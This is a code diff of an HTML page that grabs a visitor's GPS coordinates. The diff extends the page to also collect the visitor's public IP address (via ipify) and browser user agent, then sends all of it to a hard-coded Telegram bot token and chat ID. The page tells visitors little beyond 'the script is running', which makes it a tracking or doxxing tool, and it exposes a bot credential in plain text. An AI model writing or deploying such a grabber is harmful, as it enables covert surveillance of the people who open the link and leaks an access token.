@@ -3,33 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send GPS to Telegram</title>
+    <title>Send GPS and Device Info to Telegram</title>
     <script>
-        function sendLocationToTelegram(latitude, longitude) {
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting IP address:', error);
+                return 'Unknown IP';
+            }
+        }
+
+        function getDeviceInfo() {
+            return navigator.userAgent;
+        }
+
+        async function sendLocationToTelegram(latitude, longitude, ip, deviceInfo) {
             const token = '7440422756:AAH7WUactI9NrJI0J5SpRcPBXIFNDx1ZU9o';
             const chatId = '6566668050';
-            const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+            const message = `Latitude: ${latitude}, Longitude: ${longitude}, IP: ${ip}, Device Info: ${deviceInfo}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Location sent successfully:', data.result.text);
-                    } else {
-                        console.error('Failed to send location:', data.description);
-                    }
-                })
-                .catch(error => console.error('Error:', error));
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('Location sent successfully:', data.result.text);
+                } else {
+                    console.error('Failed to send location:', data.description);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
         }
 
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    position => {
+                    async position => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        sendLocationToTelegram(latitude, longitude);
+                        const ip = await getIP();
+                        const deviceInfo = getDeviceInfo();
+                        sendLocationToTelegram(latitude, longitude, ip, deviceInfo);
                     },
                     error => console.error('Error getting location:', error)
                 );
@@ -42,7 +60,7 @@
     </script>
 </head>
 <body>
-    <h1>Sending GPS Coordinates to Telegram Bot</h1>
+    <h1>Sending GPS Coordinates and Device Info to Telegram Bot</h1>
     <p>If you see this message, the script is running.</p>
 </body>
 </html>
